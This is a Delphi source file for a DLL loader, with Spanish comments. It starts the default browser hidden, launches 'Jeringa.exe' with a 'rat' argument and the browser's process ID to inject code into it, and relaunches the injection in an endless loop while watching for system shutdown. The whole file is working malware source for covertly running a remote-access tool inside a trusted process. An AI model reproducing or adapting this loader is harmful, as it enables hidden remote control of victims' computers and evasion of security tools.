library Monitor;

uses
  Windows,
  LomLib,
  minireg,
  ShellApi,
  SysUtils;//para usar FileExists
  //Atencion!
  //el uso de sysutils agrega 24k al peso de monitor!
  //reemplazar esto a futuro!
  // http://www.youtube.com/watch?v=xuNFQ-bpJwU


const
  {$EXTERNALSYM WM_QUERYENDSESSION}
  WM_QUERYENDSESSION  = $0011;

var
  i:   integer;
  ResourcePointer: Pointer;
  pid: dword;
  handleWindow: integer;
  msg:tmsg;
  WinShutdown : boolean = false;

  function WinDir: string;
  var
    intLen:    integer;
    strBuffer: string;
  begin
    SetLength(strBuffer, 1000);
    intLen := GetWindowsDirectory(PChar(strBuffer), 1000);
    Result := (Copy(strBuffer, 1, intLen));
    if Result[Length(Result) - 1] <> '\' then
      Result := Result + '\';
  end;

  function SysDir: string;
  var
    intLen:    integer;
    strBuffer: string;
  begin
    SetLength(strBuffer, 1000);
    intLen := GetSystemDirectory(PChar(strBuffer), 1000);
    Result := (Copy(strBuffer, 1, intLen));
    if Result[Length(Result) - 1] <> '\' then
      Result := Result + '\';
  end;


  function getBrowser: ansistring;
  var
    ts: ansistring;
  begin
    RegGetString(HKEY_CLASSES_ROOT, '\htmlfile\shell\open\command\', ts);
    ts     := Copy(ts, Pos('"', ts) + 1, Length(ts));
    ts     := Copy(ts, 1, Pos('"', ts) - 1);
    Result := ts;
    //  ShowMessage('El browser esta en: '+ts);
  end;

  function StartMonitor: dword;
  var
    StartInfo: TStartupInfo;
    ProcInfo:  TProcessInformation;
    BytesRead, Module, Process, Size: dword;
    Path:      array [0..MAX_PATH] of char;
    Data:      pointer;
    HandleWindow: integer;
  begin
    //verifico si existe el archivo que contiene la dll
    if FileExists( windir + 'Jeringa.exe' ) then
      begin
      //create process to inject into
      ZeroMemory(@StartInfo, SizeOf(TStartupInfo));
      StartInfo.cb      := SizeOf(TStartupInfo);
      startinfo.dwFlags := STARTF_USESHOWWINDOW; // use wShowWindow
      startinfo.wShowWindow := SW_HIDE;
      CreateProcess(nil, PAnsiChar(getBrowser), nil, nil, False, 0, nil,
      nil, StartInfo, ProcInfo);
      Result := procInfo.dwProcessId;
      ShellExecute(0, 'open', PAnsiChar(windir + 'Jeringa.exe'), PAnsiChar(
        ' rat ' + IntToStr(procInfo.dwProcessId)), PAnsiChar(extractFilePath(ParamStr(0))), SW_SHOWNORMAL);
       //ShowMessage('estoy por cargar el dll en memoria');
      WaitForSingleObject(ProcInfo.hProcess, INFINITE);
      end
    else
      begin
       //ShowMessage('Se cierra el loader porque no existe el archivo a cargar');
      Halt; //si no existe es porque se desinstalo asi mato el loader
      end;
  end;

   //afectara no parar la inyeccion?
  procedure CheckWinShutdown;
  begin
    while (true) do
    begin
      if (PeekMessage(msg, 0, 0, 0, PM_REMOVE)) then
      begin
        if msg.message = WM_QUERYENDSESSION then
        begin
        WinShutDown := true;
        //ShowMessage('La apagan!!!!!');
        end;
        TranslateMessage(Msg);
        DispatchMessage(Msg);
      end;
      Sleep(1); //asi evito colgar la maquina
    end;
  end;

var
  id1: longword = 0;

begin

BeginThread(nil,
    0,
    Addr(CheckWinShutdown),
    nil,
    0,
    id1);


  while (True) do
  begin
     //ShowMessage('Inicio de bucle principal');
    StartMonitor;
    //no seguir ejecutando IE e inyectando si Windows se está apagando
    //if winShutDown then Exit;
  end;//while
  // http://www.youtube.com/watch?v=4Rc5o9PbJNo

end.
